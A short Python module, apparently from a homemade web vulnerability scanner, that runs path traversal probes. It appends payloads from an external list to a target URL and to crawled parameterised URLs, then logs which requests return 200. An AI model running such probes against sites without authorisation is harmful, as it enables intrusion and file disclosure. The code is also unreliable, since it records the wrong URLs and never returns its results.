from general import *
import re
import requests

class mainIdor:

    def __init__(self, url, prname):
        self.url = url
        self.prname = prname
        self.urlParm = list()

        self.listUrl = file_to_set(prname + "/crawled.txt")
        self.boot()

    def boot(self):
        #memisahkan url dengan parameter dengan yang tidak
        #print(self.listUrl)
        for url in self.listUrl:
            cek = cek_link_with_parm(url)
            if cek is True:
                self.urlParm.append(url)


        self.traversal_attack(self.url)

    #fungsi melakukan traversal attack
    def traversal_attack(self, url):
        linkBerhasil = list()
        list_attack = file_to_set("list_PaTrav_attack.txt")
        for a in list_attack:
            cek = cek_link_trav(url + a)
            #print("response " + str(cek) + " : " + url + a)
            if cek == 200:
                linkBerhasil.append(url + a)

        #extended traversal path attack
        if len(self.urlParm) == 0:
            print("list don't have url with parameter")
        else:
            for link in self.urlParm:
                split = re.split("([^\?]+)(\?.*=)", link)
                for a in list_attack:
                    cek = cek_link_trav(split[1] + split[2] + a)
                    if cek == 200:
                        linkBerhasil.append(url + a)


def cek_link_trav(link):
    try:
        response = requests.get(link)
        code = response.status_code
        #print(response.url)
        if link != response.url:
            return False
        else:
            return code
    except Exception as e:
        return 404

#test = cek_link_trav("http://testsite.com/get.php?f=list$g=coba")
#print(test)

#test = cek_link_trav("https://www.google.com/")
#print(test)

